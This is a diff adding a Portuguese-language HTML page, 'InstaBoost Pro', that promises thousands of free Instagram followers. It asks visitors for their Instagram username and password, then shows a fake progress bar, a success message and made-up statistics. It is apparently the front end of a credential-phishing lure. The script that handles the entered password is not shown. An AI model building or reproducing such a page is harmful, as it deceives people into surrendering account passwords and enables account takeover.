@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="pt-br" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>InstaBoost Pro</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <audio id="sucessoAudio" src="success.mp3" preload="auto"></audio>
+  <div class="background-animation"></div>
+  <main class="container">
+
+    <!-- TELA 1 - INÍCIO -->
+    <section id="tela-inicial" class="tela active fade">
+      <h1 class="logo">🚀 InstaBoost</h1>
+      <p class="descricao">Quer ganhar seguidores rápido e fácil no Instagram?</p>
+      <div class="botoes">
+        <button onclick="irParaEscolha()">✅ Sim, quero!</button>
+        <button onclick="recusar()">❌ Não, obrigado</button>
+      </div>
+    </section>
+
+    <!-- TELA 2 - ESCOLHA -->
+    <section id="tela-seguidores" class="tela fade">
+      <h2>🥇 Etapa 1: Escolha a quantidade</h2>
+      <div class="botoes">
+        <button onclick="selecionarQuantidade('5.000')">5.000 Seguidores</button>
+        <button onclick="selecionarQuantidade('10.000')">10.000 Seguidores</button>
+        <button onclick="selecionarQuantidade('20.000')">20.000 Seguidores</button>
+      </div>
+    </section>
+
+    <!-- TELA 3 - LOGIN -->
+    <section id="tela-login" class="tela fade">
+      <h2>🔒 Etapa 2: Digite seu @usuário e senha</h2>
+      <input type="text" id="username" placeholder="@seuusuario" />
+      <input type="password" id="senha" placeholder="Digite sua senha" />
+      <button onclick="enviar()">📨 Enviar Seguidores</button>
+    </section>
+
+    <!-- TELA 4 - PROCESSANDO -->
+    <section id="tela-processando" class="tela fade">
+      <h2>🕒 Processando...</h2>
+      <p>Enviando seguidores para <strong id="usuario-processado"></strong>...</p>
+      <div class="loader"></div>
+      <div class="progress-bar"><div class="progress-fill" id="barra"></div></div>
+    </section>
+
+    <!-- TELA 5 - SUCESSO -->
+    <section id="tela-final" class="tela fade">
+      <h2>✅ Sucesso!</h2>
+      <p><strong id="quantidade-final"></strong> seguidores enviados para <strong id="usuario-final"></strong>.</p>
+      <button onclick="mostrarEstatisticas()">📊 Ver Estatísticas</button>
+    </section>
+
+    <!-- TELA 6 - ESTATÍSTICAS -->
+    <section id="tela-estatisticas" class="tela fade">
+      <h2>📊 Estatísticas do InstaBoost</h2>
+      <ul class="stats">
+        <li>👥 Seguidores enviados hoje: <strong>25.300</strong></li>
+        <li>🌐 Usuários online agora: <strong>182</strong></li>
+        <li>⚡ Última entrega: <strong>@insta_destaque</strong></li>
+      </ul>
+      <button onclick="reiniciar()">🔁 Início</button>
+    </section>
+
+    <!-- TELA 7 - RECUSADO -->
+    <section id="tela-recusado" class="tela fade">
+      <h2>👋 Até logo!</h2>
+      <p>Você recusou participar. Volte quando quiser. 😄</p>
+    </section>
+
+  </main>
+  <script src="script.js"></script>
+</body>
+</html>
